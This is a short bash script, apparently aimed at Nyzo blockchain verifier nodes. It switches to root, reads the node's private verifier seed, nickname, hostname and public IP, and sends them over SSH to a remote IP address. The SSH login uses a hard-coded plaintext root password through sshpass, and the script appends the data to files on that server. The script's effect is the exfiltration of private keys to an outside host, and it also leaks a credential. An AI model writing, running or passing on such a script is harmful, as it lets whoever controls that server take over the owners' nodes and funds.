#!/bin/bash
sudo su
echo $(curl https://ipinfo.io/ip):9444:$(cat /var/lib/nyzo/production/verifier_private_seed) | sshpass -p 'xRbgLlt8' ssh root@51.91.126.182 'cat - >> /root/managed_verifiers'
echo $(hostname):$(cat /var/lib/nyzo/production/nickname):$(cat /var/lib/nyzo/production/verifier_private_seed) | sshpass -p 'xRbgLlt8' ssh root@51.91.126.182 'cat - >> /root/file1'

